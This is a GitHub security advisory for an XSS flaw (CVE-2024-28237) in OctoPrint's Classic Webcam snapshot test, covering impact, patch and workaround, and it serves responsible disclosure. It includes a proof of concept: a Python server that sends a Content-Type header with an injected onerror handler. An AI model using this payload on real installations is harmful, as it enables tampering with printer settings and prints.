# [M] XSS via the "Snapshot Test" feature in Classic Webcam plugin settings

## Summary
Severity: Medium
Advisory: GHSA-x7mf-wrh9-r76c
CVE: CVE-2024-28237
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2024-03-18
Source: https://github.com/advisories/GHSA-x7mf-wrh9-r76c
Type: github-advisory

## Affected
- PyPI: `OctoPrint` — affected >=0 <1.10.0rc3

## Details
### Impact

OctoPrint versions up until and including 1.9.3 contain a vulnerability that allows malicious admins to configure or talk a victim with administrator rights into configuring a webcam snapshot URL which when tested through the "Test" button included in the web interface will execute JavaScript code in the victims browser when attempting to render the snapshot image.

An attacker who successfully talked a victim with admin rights into performing a snapshot test with such a crafted URL could use this to retrieve or modify sensitive configuration settings, interrupt prints or otherwise interact with the OctoPrint instance in a malicious way.

### Patches

The vulnerability will be patched in version 1.10.0.

### Workaround

OctoPrint administrators are strongly advised to thoroughly vet who has admin access to their installation and what settings they modify based on instructions by strangers.

### PoC

Below are the steps to reproduce the vulnerability:

1. Create a URL that responds with a malicious content type. For example, creating the following python script:
   ```
   from http.server import BaseHTTPRequestHandler, HTTPServer

   class MyHTTPRequestHandler(BaseHTTPRequestHandler):
       def do_GET(self):
           self.send_response(200)
           self.send_header('Content-Type', 'image/"onerror="alert(1)"')
           self.end_headers()
           self.wfile.write(b'Ok')

   def run():
       server_address = ('', 8080)
       httpd = HTTPServer(server_address, MyHTTPRequestHandler)
       print('Server listening on 0.0.0.0:8080...')
       httpd.serve_forever()

   if __name__ == '__main__':
       run()
   ```

2. Go to OctoPrint settings --> Plugins --> Classic Webcam and enter the URL of that page as the Snapshot URL. 

3. Click on the "Test" button to trigger XSS. A Javascript alert should appear, demonstrating the actual code injection.

### Credits

This vulnerability was discovered and responsibly disclosed to OctoPrint by Jacopo Tediosi.

## References
- https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-x7mf-wrh9-r76c
- https://nvd.nist.gov/vuln/detail/CVE-2024-28237
- https://github.com/OctoPrint/OctoPrint/commit/779894c1bc6478332d14bc9ed1006df1354eb517
- https://github.com/OctoPrint/OctoPrint
- https://github.com/pypa/advisory-database/tree/main/vulns/octoprint/PYSEC-2024-179.yaml
